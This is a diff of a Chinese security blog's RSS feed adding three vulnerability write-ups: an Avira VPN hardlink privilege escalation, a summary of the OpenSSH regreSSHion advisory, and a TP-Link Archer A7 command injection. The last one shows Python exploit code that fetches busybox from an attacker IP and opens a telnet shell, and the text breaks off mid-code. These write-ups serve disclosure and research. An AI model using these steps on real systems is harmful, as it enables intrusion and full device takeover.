@@ -7,7 +7,593 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>qife</copyright>
-        <lastBuildDate>Wed, 06 Aug 2025 12:03:02 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Thu, 07 Aug 2025 15:56:31 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Avira VPN 2.15.2.28160本地权限提升漏洞分析</title>
+        <link>http://localhost:1313/p/avira-vpn-2.15.2.28160%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</link>
+        <pubDate>Thu, 07 Aug 2025 15:56:31 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/avira-vpn-2.15.2.28160%E6%9C%AC%E5%9C%B0%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h3 id=&#34;产品信息&#34;&gt;产品信息
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;版本&lt;/strong&gt;: Avira Phantom VPN 2.15.2.28160&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;下载源&lt;/strong&gt;: &lt;a class=&#34;link&#34; href=&#34;https://package.avira.com/package/oeavira/win/int/avira_en_vpn__ws.exe&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;官方安装包链接&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;测试系统&lt;/strong&gt;: Windows 10 1803 (x64)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;漏洞概述&#34;&gt;漏洞概述
+&lt;/h3&gt;&lt;p&gt;Avira VPN服务在修改VPN配置时，会调整&lt;code&gt;C:\ProgramData\Avira\VPN\&lt;/code&gt;目录下&lt;code&gt;VpnSharedSettings.backup&lt;/code&gt;和&lt;code&gt;VpnSharedSettings.config&lt;/code&gt;文件的DACL（自主访问控制列表）。通过创建硬链接指向目标文件（如&lt;code&gt;phantomvpn.exe&lt;/code&gt;），攻击者可利用此漏洞覆盖目标文件的DACL，最终实现从低权限用户到SYSTEM的权限提升。&lt;/p&gt;
+&lt;h3 id=&#34;漏洞原理&#34;&gt;漏洞原理
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;触发条件&lt;/strong&gt;: 通过VPN GUI修改配置（如取消勾选“发送诊断数据”）时，服务端调用&lt;code&gt;Avira.VPN.Core.dll&lt;/code&gt;中的&lt;code&gt;AdjustSecurity()&lt;/code&gt;函数。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;权限修改&lt;/strong&gt;: 对于共享配置文件（&lt;code&gt;StorageType&lt;/code&gt;为&lt;code&gt;AllUserAccess&lt;/code&gt;），服务会将文件DACL设置为允许所有认证用户完全控制。&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;利用链&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;攻击者创建硬链接，将&lt;code&gt;VpnSharedSettings.backup&lt;/code&gt;指向目标文件（如&lt;code&gt;phantomvpn.exe&lt;/code&gt;）。&lt;/li&gt;
+&lt;li&gt;触发配置更改后，目标文件的DACL被覆盖为低权限用户可写。&lt;/li&gt;
+&lt;li&gt;替换目标文件为恶意二进制，并通过VPN连接触发执行，获得SYSTEM权限。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;复现步骤&#34;&gt;复现步骤
+&lt;/h3&gt;&lt;ol&gt;
+&lt;li&gt;创建硬链接指向&lt;code&gt;phantomvpn.exe&lt;/code&gt;:
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;mklink&lt;/span&gt; /H C:\ProgramData\Avira\VPN\VpnSharedSettings.backup &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:\Program Files (x86)\Avira\VPN\OpenVPN\phantomvpn.exe&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;在VPN设置中取消勾选“发送诊断数据”，触发DACL修改。&lt;/li&gt;
+&lt;li&gt;替换&lt;code&gt;phantomvpn.exe&lt;/code&gt;为恶意程序，点击“Secure my Connection”执行。&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;时间线&#34;&gt;时间线
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;2018年9月28日&lt;/strong&gt;: 向Avira报告&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2018年10月4日&lt;/strong&gt;: Avira确认复现&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;2018年12月13日&lt;/strong&gt;: 漏洞修复&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id=&#34;关联漏洞&#34;&gt;关联漏洞
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e7%9b%b8%e5%85%b3%e9%93%be%e6%8e%a5&#34; &gt;Avira VPN通过不安全更新路径的本地提权（2020年1月）&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e7%9b%b8%e5%85%b3%e9%93%be%e6%8e%a5&#34; &gt;Avira Optimizer本地提权漏洞（2019年8月）&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+</description>
+        </item>
+        <item>
+        <title>OpenSSH服务器远程代码执行漏洞(CVE-2024-6387) - regreSSHion漏洞深度分析</title>
+        <link>http://localhost:1313/p/openssh%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2024-6387-regresshion%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/</link>
+        <pubDate>Thu, 07 Aug 2025 08:16:52 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/openssh%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9Ecve-2024-6387-regresshion%E6%BC%8F%E6%B4%9E%E6%B7%B1%E5%BA%A6%E5%88%86%E6%9E%90/</guid>
+        <description>&lt;h1 id=&#34;openssh服务器远程代码执行漏洞cve-2024-6387---regresshion&#34;&gt;OpenSSH服务器远程代码执行漏洞(CVE-2024-6387) - regreSSHion
+&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;2024年7月3日更新&lt;/strong&gt;&lt;/p&gt;
+&lt;h2 id=&#34;摘要&#34;&gt;摘要
+&lt;/h2&gt;&lt;p&gt;发现OpenSSH服务器(sshd)中存在一个严重漏洞(CVE-2024-6387)，命名为regreSSHion。该漏洞源于信号处理程序中的竞争条件，当客户端在指定时间(LoginGraceTime)内未能完成认证时触发，可能导致远程代码执行(RCE)。此漏洞在2020年10月被无意中重新引入，影响基于glibc的Linux系统上8.5p1至9.7p1版本的OpenSSH。未经认证的攻击者可远程利用此漏洞，可能以root权限执行任意代码。&lt;/p&gt;
+&lt;h2 id=&#34;受影响系统和应用&#34;&gt;受影响系统和应用
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;易受攻击版本:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;OpenSSH &amp;lt; 4.4p1（若未针对CVE-2006-5051或CVE-2008-4109打补丁）&lt;/li&gt;
+&lt;li&gt;8.5p1 &amp;lt;= OpenSSH &amp;lt; 9.8p1（因信号处理程序中关键安全检查被意外移除）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;不受影响版本:&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;4.4p1 &amp;lt;= OpenSSH &amp;lt; 8.4p1（受&amp;quot;#ifdef DO_LOG_SAFE_IN_SIGHAND&amp;quot;指令保护）&lt;/li&gt;
+&lt;li&gt;OpenBSD版本（使用异步信号安全的syslog_r()）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;技术细节攻击概述&#34;&gt;技术细节/攻击概述
+&lt;/h2&gt;&lt;p&gt;当客户端未在LoginGraceTime期限内完成认证时，sshd的SIGALRM处理程序会被异步调用。该处理程序调用了非异步信号安全的syslog()函数，导致竞争条件。攻击者可利用此条件在sshd特权代码中实现远程代码执行。&lt;/p&gt;
+&lt;p&gt;漏洞利用涉及三个主要版本的OpenSSH在不同Debian和Ubuntu系统上的表现。已成功在启用ASLR的32位Linux/glibc系统上演示利用。实验室条件下，攻击平均需要6-8小时的持续连接尝试（达到服务器接受的最大连接数）。&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;SSH-2.0-OpenSSH_3.4p1 Debian 1:3.4p1-1.woody.3 (Debian 3.0r6, 2005)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;理论：针对sshd公钥解析代码中的free()调用，导致堆损坏&lt;/li&gt;
+&lt;li&gt;实践：约需10,000次尝试，平均约1周获得远程root shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;SSH-2.0-OpenSSH_4.2p1 Debian-7ubuntu3 (Ubuntu 6.06.1, 2006)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;理论：聚焦SIGALRM处理程序中的pam_start()，使PAM结构不一致，然后在pam_end()调用时利用此状态&lt;/li&gt;
+&lt;li&gt;实践：约需10,000次尝试，平均1-2天获得远程root shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;SSH-2.0-OpenSSH_9.2p1 Debian-2+deb12u2 (Debian 12.5.0, 2024)&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;理论：利用SIGALRM处理程序中syslog()的malloc()调用&lt;/li&gt;
+&lt;li&gt;实践：约需10,000次尝试，平均6-8小时获得远程root shell&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;临时解决方案&#34;&gt;临时解决方案
+&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;SSHD代码修改&lt;/strong&gt;
+可直接修改代码，在sshsigdie()函数中添加C预处理器指令以避免调用不安全函数。但请注意这些修改可能有副作用且未经充分测试，CFC建议直接更新SSH版本。&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;SSH配置加固&lt;/strong&gt;
+在&lt;code&gt;sshd_config&lt;/code&gt;中调整以下设置以降低攻击有效性：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;LoginGraceTime&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;设置为0：通过消除认证超时期来防止漏洞&lt;/li&gt;
+&lt;li&gt;注意：此设置可能占用系统资源，因为它移除了认证尝试的超时限制&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;MaxStartups&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;设置为较小数值：限制未认证连接数&lt;/li&gt;
+&lt;li&gt;注意：设置过低可能阻止合法用户，特别是在攻击激烈或主机用户数多时&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;strong&gt;PerSourceMaxStartups&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;设置为较小数值：限制单个源IP的并发未认证连接&lt;/li&gt;
+&lt;li&gt;注意：设置过低可能阻止合法用户&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;实施这些配置可增强SSH服务器安全性，但会使sshd面临因耗尽所有连接而导致的拒绝服务风险，同时消除远程代码执行风险。&lt;/p&gt;
+&lt;h2 id=&#34;建议&#34;&gt;建议
+&lt;/h2&gt;&lt;p&gt;针对OpenSSH中允许Linux系统远程代码执行的regreSSHion漏洞，需要采取战略性和多层次的安全措施：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;补丁管理&lt;/strong&gt;：立即应用可用的OpenSSH补丁，并优先考虑定期更新&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;增强访问控制&lt;/strong&gt;：使用基于网络的控制限制SSH访问，减少攻击面&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;网络分段和入侵检测&lt;/strong&gt;：分段网络以防止对关键系统的未授权访问和横向移动，部署入侵检测系统监控和警报利用尝试的可疑活动&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;cfc行动&#34;&gt;CFC行动
+&lt;/h2&gt;&lt;p&gt;Kudelski Security在撰写本文时未观察到或收到这些漏洞被主动利用的迹象。CFC将持续监控情况，必要时发布咨询更新。具有漏洞扫描服务的客户将在扫描提供商提供插件后立即收到相关关键漏洞的扫描结果。&lt;/p&gt;
+&lt;h2 id=&#34;参考资料&#34;&gt;参考资料
+&lt;/h2&gt;&lt;p&gt;[多个外部参考链接已省略]&lt;/p&gt;
+</description>
+        </item>
+        <item>
+        <title>TP-Link Archer A7漏洞分析与利用：从逆向工程到远程代码执行</title>
+        <link>http://localhost:1313/p/tp-link-archer-a7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E4%BB%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</link>
+        <pubDate>Thu, 07 Aug 2025 06:02:51 +0800</pubDate>
+        
+        <guid>http://localhost:1313/p/tp-link-archer-a7%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8%E4%BB%8E%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E5%88%B0%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</guid>
+        <description>&lt;h1 id=&#34;环境搭建&#34;&gt;环境搭建
+&lt;/h1&gt;&lt;p&gt;调试和分析主要在路由器环境中进行。通过USB-TTL设备获取路由器交互式shell的方法已有相关指南，这里不再赘述。OpenWRT提供了&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a51&#34; &gt;指南1&lt;/a&gt;和&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a52&#34; &gt;指南2&lt;/a&gt;说明具体操作。&lt;/p&gt;
+&lt;p&gt;对于代码分析，采用了bindiff方法来定位漏洞函数。可从以下链接下载有漏洞和已修复的固件版本：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;修复版本：Archer A7(US)_V5_200220&lt;/li&gt;
+&lt;li&gt;漏洞版本：Archer C7(US)_V5_190726&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;注意Archer C7和A7型号共享大多数二进制文件，因此分析C7或A7固件镜像均可。&lt;/p&gt;
+&lt;h1 id=&#34;bindiff分析&#34;&gt;BinDiff分析
+&lt;/h1&gt;&lt;p&gt;首先从固件中提取MIPS(Big Endian)二进制文件并加载到Ghidra中。按照&lt;a class=&#34;link&#34; href=&#34;%e9%a1%b9%e7%9b%ae%e9%93%be%e6%8e%a5&#34; &gt;BinDiffHelper项目&lt;/a&gt;的说明进行操作，同时下载安装bindiff6。&lt;/p&gt;
+&lt;p&gt;使用Ghidra和Bindiff后，发现几个相似度很低的函数。跟踪这些地址发现，FUN_00414D14似乎指向一个函数，这可能是存在漏洞的函数。&lt;/p&gt;
+&lt;h1 id=&#34;静态分析&#34;&gt;静态分析
+&lt;/h1&gt;&lt;p&gt;根据ZDI网站上的CVE报告描述，漏洞存在于默认监听UDP端口20002的tdpServer服务中。当解析slave_mac参数时，该服务未正确验证用户输入的字符串就直接用于执行系统调用。&lt;/p&gt;
+&lt;p&gt;在反编译代码中搜索slave_mac字符串，发现多个结果。第一个搜索结果中，有多个地方包含slave_mac字符串，其中还包括对FUN_00414d14函数的引用。&lt;/p&gt;
+&lt;p&gt;关键的字符串&amp;quot;tdpUciInterface.c:644&amp;quot;,&amp;ldquo;About to get slave mac %s info&amp;quot;只有一处引用，地址为0x40e7e4。根据Bindiff，这里很可能没有变化或差异。&lt;/p&gt;
+&lt;h1 id=&#34;寻找system调用&#34;&gt;寻找system()调用
+&lt;/h1&gt;&lt;p&gt;根据CVE描述，我们需要寻找攻击者可能控制的system()函数调用。在FUN_00414d14函数中发现了三个system调用，其中一个特别有趣：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nf&#34;&gt;snprintf&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;interesting_acStack7432&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mh&#34;&gt;0x1ff&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;s&#34;&gt;&amp;#34;lua -e &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;require(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;luci.controller.admin.onemesh&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;).sync_wifi_specified({mac=&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;%s&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;})&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to_be_controlled_acStack4248&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;漏洞利用&#34;&gt;漏洞利用
+&lt;/h1&gt;&lt;p&gt;在这个漏洞函数中，slave_mac值可以控制传递给system()的参数。我们可以通过以下步骤实现利用：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;为MIPS Big Endian设置GDB服务器&lt;/li&gt;
+&lt;li&gt;测试与tdpServer的连接&lt;/li&gt;
+&lt;li&gt;制作有效载荷&lt;/li&gt;
+&lt;li&gt;完整漏洞利用&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h2 id=&#34;制作数据包&#34;&gt;制作数据包
+&lt;/h2&gt;&lt;p&gt;数据包由16字节的包头和最大0x410字节的JSON有效载荷组成。第一个字节表示tdp版本，这个固件只接受版本1的数据包。&lt;/p&gt;
+&lt;p&gt;数据包校验和计算使用CRC-32算法。校验通过后，有效载荷会使用IV和DecryptKey通过AES_DECRYPT在CBC模式下解密。&lt;/p&gt;
+&lt;h2 id=&#34;命令注入&#34;&gt;命令注入
+&lt;/h2&gt;&lt;p&gt;slave_mac字段用于将字符写入文件p。该字段有17个字符的限制。命令注入工作原理如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-lua&#34; data-lang=&#34;lua&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;lua&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;require(&amp;#34;luci.controller.admin.onemesh&amp;#34;).sync_wifi_specified({mac=&amp;#34; &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;INJECT&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;HERE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39; &amp;#34;})&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们使用printf将字符追加到文件中，通过发送多个数据包构建完整脚本后执行。&lt;/p&gt;
+&lt;h1 id=&#34;完整漏洞利用&#34;&gt;完整漏洞利用
+&lt;/h1&gt;&lt;p&gt;要实现反向shell，可以从我们的机器下载busybox，然后使用telnetd获取反向shell，通过wget命令逐个字符写入文件并执行。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;pwn&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;socket&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;time&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;Crypto.Cipher&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;AES&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;zlib&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.0.125&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;ATTACKPORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;8090&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;fileName&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;m&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;COMMAND&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;wget http://&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;:8000/busybox-mips -P /tmp;chmod +x /tmp/busybox-mips;/tmp/busybox-mips telnetd -l /bin/sh -p &amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ATTACKPORT&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;ATTACKERIP&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;;wget http://&amp;#34;&lt;/span&gt; &lt;span 